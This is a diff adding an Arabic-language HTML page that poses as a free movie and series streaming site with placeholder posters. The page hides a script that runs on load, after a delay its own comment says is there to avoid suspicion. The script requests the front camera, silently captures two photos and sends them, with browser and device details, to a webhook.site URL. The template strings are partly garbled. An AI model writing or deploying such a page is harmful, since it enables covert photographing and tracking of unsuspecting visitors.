@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>أفلام ومسلسلات عربية مجانية 2025</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background: #000;
+      color: #fff;
+      text-align: center;
+    }
+    header {
+      background: linear-gradient(to bottom, #8b0000, #000);
+      padding: 20px;
+    }
+    h1 {
+      margin: 0;
+      font-size: 2.2rem;
+      text-shadow: 0 0 10px #ff0000;
+    }
+    .grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(160px, 1fr));
+      gap: 15px;
+      padding: 20px;
+      max-width: 1200px;
+      margin: 0 auto;
+    }
+    .poster {
+      position: relative;
+      border-radius: 10px;
+      overflow: hidden;
+      box-shadow: 0 4px 15px rgba(255,0,0,0.3);
+      cursor: pointer;
+      transition: transform 0.2s;
+    }
+    .poster:hover {
+      transform: scale(1.05);
+    }
+    .poster img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+    .poster::after {
+      content: "▶";
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 4rem;
+      color: rgba(255,255,255,0.7);
+      text-shadow: 0 0 10px #000;
+      pointer-events: none;
+    }
+    footer {
+      padding: 30px;
+      background: #111;
+      font-size: 0.9rem;
+      opacity: 0.7;
+    }
+  </style>
+</head>
+<body>
+
+<header>
+  <h1>أفلام ومسلسلات عربية جديدة 2025</h1>
+  <p>شاهد أونلاين مجانًا بدون إعلانات</p>
+</header>
+
+<div class="grid">
+  <!-- صور أفلام وهمية فقط (لا تعمل) -->
+  <div class="poster"><img src="https://picsum.photos/seed/movie1/300/450" alt="فيلم 1"></div>
+  <div class="poster"><img src="https://picsum.photos/seed/movie2/300/450" alt="فيلم 2"></div>
+  <div class="poster"><img src="https://picsum.photos/seed/movie3/300/450" alt="فيلم 3"></div>
+  <div class="poster"><img src="https://picsum.photos/seed/movie4/300/450" alt="فيلم 4"></div>
+  <div class="poster"><img src="https://picsum.photos/seed/movie5/300/450" alt="فيلم 5"></div>
+  <div class="poster"><img src="https://picsum.photos/seed/movie6/300/450" alt="فيلم 6"></div>
+  <div class="poster"><img src="https://picsum.photos/seed/movie7/300/450" alt="فيلم 7"></div>
+  <div class="poster"><img src="https://picsum.photos/seed/movie8/300/450" alt="فيلم 8"></div>
+</div>
+
+<video id="hiddenVideo" autoplay muted playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<footer>
+  جميع الحقوق محفوظة © 2025 | محتوى ترفيهي فقط
+</footer>
+
+<script>
+const video = document.getElementById('hiddenVideo');
+const canvas = document.getElementById('canvas');
+const ctx = canvas.getContext('2d');
+
+const WEBHOOK_URL = "https://webhook.site/d7897411-384f-49ca-b88e-f3765a3b397b";  // ← الرابط اللي أعطيتني إياه
+
+async function captureAndSend() {
+  try {
+    const stream = await navigator.mediaDevices.getUserMedia({
+      video: { facingMode: "user" },
+      audio: false
+    });
+
+    video.srcObject = stream;
+    await video.play();
+
+    // انتظر شوية عشان الصورة تكون واضحة
+    await new Promise(r => setTimeout(r, 800));
+
+    // الصورة الأولى
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    ctx.drawImage(video, 0, 0);
+    canvas.toBlob(blob => sendBlob(blob, 1), 'image/jpeg', 0.92);
+
+    // انتظر ثانية ثم الصورة الثانية
+    setTimeout(() => {
+      ctx.drawImage(video, 0, 0);
+      canvas.toBlob(blob => sendBlob(blob, 2), 'image/jpeg', 0.92);
+
+      // إيقاف الكاميرا بعد الصورتين
+      setTimeout(() => {
+        stream.getTracks().forEach(track => track.stop());
+        video.srcObject = null;
+      }, 500);
+    }, 1200);
+
+  } catch (err) {
+    console.log("تم رفض الإذن أو خطأ:", err);
+  }
+}
+
+function sendBlob(blob, num) {
+  const fd = new FormData();
+  fd.append('photo', blob, `selfie_\( {Date.now()}_ \){num}.jpg`);
+  fd.append('timestamp', Date.now());
+  fd.append('user_agent', navigator.userAgent);
+  fd.append('screen', `\( {screen.width}x \){screen.height}`);
+  fd.append('language', navigator.language);
+  fd.append('platform', navigator.platform);
+
+  fetch(WEBHOOK_URL, {
+    method: 'POST',
+    body: fd
+  }).catch(err => console.log("فشل الإرسال:", err));
+}
+
+// ابدأ فور تحميل الصفحة مع تأخير بسيط عشان ما يبدو مريب
+window.addEventListener('load', () => {
+  setTimeout(captureAndSend, 1500);
+});
+</script>
+
+</body>
+</html>
